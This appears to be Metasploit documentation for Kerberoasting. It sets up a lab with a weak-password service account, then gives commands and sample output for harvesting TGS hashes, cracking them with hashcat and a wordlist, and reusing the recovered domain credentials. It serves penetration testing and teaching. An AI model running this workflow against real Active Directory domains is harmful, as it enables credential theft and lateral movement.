## Kerberoasting

Kerberoasting is a technique that finds Service Principal Names (SPN) in Active Directory that are associated with
normal user accounts on the domain, and then requesting Ticket Granting Service (TGS) tickets for those accounts from
the KDC. These TGS tickets are encrypted with the Service's password, which may be weak - and susceptible to brute force
attacks.

Services are normally configured to use computer accounts which have very long and secure passwords, but services
associated with normal user accounts will have passwords entered by a human and may be short and weak - and a good
target for brute attacks.

If successful, the attacker possesses user credentials that can be used to impersonate the account owner. Now the attacker
appears to be an approved and legitimate user - having access to the same privileges, assets, systems, etc, that have
been granted to the compromised account, boom roasted.

## Vulnerable Targets

Any system leveraging Kerberos as a means of authentication e.g. Active Directory, MSSQL, which have Service Principal
Names (SPN) associated with normal user accounts on the domain.

## Lab Environment

For testing purposes on an Active Directory environment you can create a user account and register an SPN manually as an
example of this technique:

```
# Create a basic user account with a weak password for our service
net user /add svc_kerberoastable password123

# Mark the account and password as never expiring, to ensure the lab setup still works in the future
net user svc_kerberoastable /expires:never
powershell /c Set-AdUser -Identity svc_kerberoastable -PasswordNeverExpires $true

# Create a Service Principal Name which uses the user account with a weak password
cmd /c setspn -a %computername%/svc_kerberoastable.%userdnsdomain%:1337 %userdomain%\svc_kerberoastable
```

## Scenarios

Metasploit ships a native Kerberoasting module, `auxiliary/gather/kerberoast`, which does everything end-to-end without
requiring Python, Impacket, Kiwi, or any other external tooling: it queries LDAP for kerberoastable accounts, requests
TGS tickets from the KDC, and stores the resulting hashes in the Metasploit credentials database. Once the hashes are in
the database, the `auxiliary/analyze/crack_windows` module can crack them in `hashcat` mode and write the recovered
plaintext password back to the same credential record.

The end-to-end flow is:

1. Run `auxiliary/gather/kerberoast` to enumerate kerberoastable SPNs and harvest the TGS hashes
2. Run `auxiliary/analyze/crack_windows` in `hashcat` mode to recover the plaintext password from the harvested hashes
3. View the cracked credentials with the `creds` command

### Step 1: Harvest hashes with `auxiliary/gather/kerberoast`

The `auxiliary/gather/kerberoast` module needs a set of valid domain credentials and the IP of a Domain Controller.
By default the module will enumerate every kerberoastable account in the domain; if you want to target a single account
(for example, the one created in the lab setup above) you can set the `TARGET_USER` option.

```
msf > use auxiliary/gather/kerberoast
msf auxiliary(gather/kerberoast) > run rhosts=192.168.123.13 ldapusername=Administrator ldappassword=p4$$w0rd ldapdomain=adf3.local target_user=svc_kerberoastable
```

A successful run looks like this:

```
[*] Running module against 192.168.123.13
[+] 192.168.123.13:88 - Received a valid TGT-Response
[*] 192.168.123.13:389 - TGT MIT Credential Cache ticket saved to /home/msfuser/.msf4/loot/20260512120000_default_192.168.123.13_mit.kerberos.cca_123456.bin
[+] 192.168.123.13:88 - Received a valid TGS-Response
[*] 192.168.123.13:389 - TGS MIT Credential Cache ticket saved to /home/msfuser/.msf4/loot/20260512120000_default_192.168.123.13_mit.kerberos.cca_654321.bin
[+] Success: $krb5tgs$23$*svc_kerberoastable$ADF3.LOCAL$dc3/svc_kerberoastable.adf3.local~1337*$c2e73c1dcdcef4c926cb263abedf75ed$263fea3ad446bd6b4b8...
[*] Auxiliary module execution completed
```

The module stores the hash in the Metasploit database. If a domain account supports more than one Kerberos encryption
type, the module will harvest a hash for each supported type (RC4, AES128, and AES256), each of which is stored as a
separate credential record (`krb5tgs-rc4`, `krb5tgs-aes128`, `krb5tgs-aes256`). You can view the harvested hashes at any
time with the `creds` command:

```
msf auxiliary(gather/kerberoast) > creds -t krb5tgs-rc4
```

If you want a copy of the hash on disk - for example to feed to a standalone cracker - you can export it from the
database in either hashcat or John the Ripper format using `creds -O` and the appropriate file extension:

```
msf auxiliary(gather/kerberoast) > creds -t krb5tgs-rc4 -O 192.168.123.13 -o /tmp/krb5tgs.hcat
[*] Wrote creds to /tmp/krb5tgs.hcat
```

For most workflows this manual export is unnecessary - the next step does it automatically.

### Step 2: Crack the hash with `auxiliary/analyze/crack_windows`

Once the hashes are in the database, the `auxiliary/analyze/crack_windows` module will pull them out, hand them to
hashcat or JtR, and write any cracked plaintext passwords back into the credential record. Support for the kerberoast
hash types `krb5tgs-rc4`, `krb5tgs-aes128`, `krb5tgs-aes256`, `krb5asrep` and `timeroast` hashes was added in
[PR #20881](https://github.com/rapid7/metasploit-framework/pull/20881).

To kick off cracking, switch to the module, set `ACTION` to `hashcat`, and optionally point `CUSTOM_WORDLIST` at a
wordlist of your choice:

```
msf auxiliary(gather/kerberoast) > use auxiliary/analyze/crack_windows
msf auxiliary(analyze/crack_windows) > set ACTION hashcat
ACTION => hashcat
msf auxiliary(analyze/crack_windows) > set CUSTOM_WORDLIST /usr/share/wordlists/rockyou.txt
CUSTOM_WORDLIST => /usr/share/wordlists/rockyou.txt
msf auxiliary(analyze/crack_windows) > run
```

When the module finishes you'll see a summary of any hashes that were cracked, along with the recovered plaintext
password and the method used to crack them:

```
[+] Cracked Hashes
==============

 DB ID  Hash Type       Username            Cracked Password  Method
 -----  ---------       --------            ----------------  ------
 121    krb5tgs-rc4     svc_kerberoastable  password123       Wordlist
 122    krb5tgs-aes128  svc_kerberoastable  password123       Already Cracked/POT
 123    krb5tgs-aes256  svc_kerberoastable  password123       Already Cracked/POT
```

Subsequent runs of `crack_windows` against the same hash will be served out of hashcat's pot file and reported as
`Already Cracked/POT`.

### Step 3: View the recovered credentials

Cracked passwords are stored back on the original credential record in the database, so a plain `creds` query against
the target host will surface them:

```
msf auxiliary(analyze/crack_windows) > creds 192.168.123.13
```

The cracked password can then be used like any other set of domain credentials - for example to authenticate to
SMB, WMI, or LDAP, or as input to further Active Directory attack modules.

### Notes on encryption types

Most public kerberoasting tooling preferentially requests RC4-HMAC (etype 23) TGS tickets because RC4 hashes are
considerably faster to crack on a GPU than AES. The `auxiliary/gather/kerberoast` module will request whichever
encryption types the target account advertises support for, and `creds` will surface one record per encryption type.
If only AES hashes are returned (because the domain has disabled RC4), cracking will be slower but the workflow is
otherwise identical - `crack_windows` in `hashcat` mode handles all of `krb5tgs-rc4`, `krb5tgs-aes128`, and
`krb5tgs-aes256`.

### Manual / advanced workflow

The `auxiliary/gather/kerberoast` module is the recommended entry point, but the building blocks remain available
for users who want to drive the process by hand. The `auxiliary/gather/ldap_query` module with
`ACTION ENUM_USER_SPNS_KERBEROAST` will list kerberoastable SPNs without requesting any tickets, which can be useful
for reconnaissance before deciding which accounts to target. Hashes exported from the database with `creds -O` can be
fed directly into a standalone hashcat or John the Ripper installation - use hash mode `13100` for RC4 (`krb5tgs-rc4`),
`19600` for AES128 (`krb5tgs-aes128`), and `19700` for AES256 (`krb5tgs-aes256`).
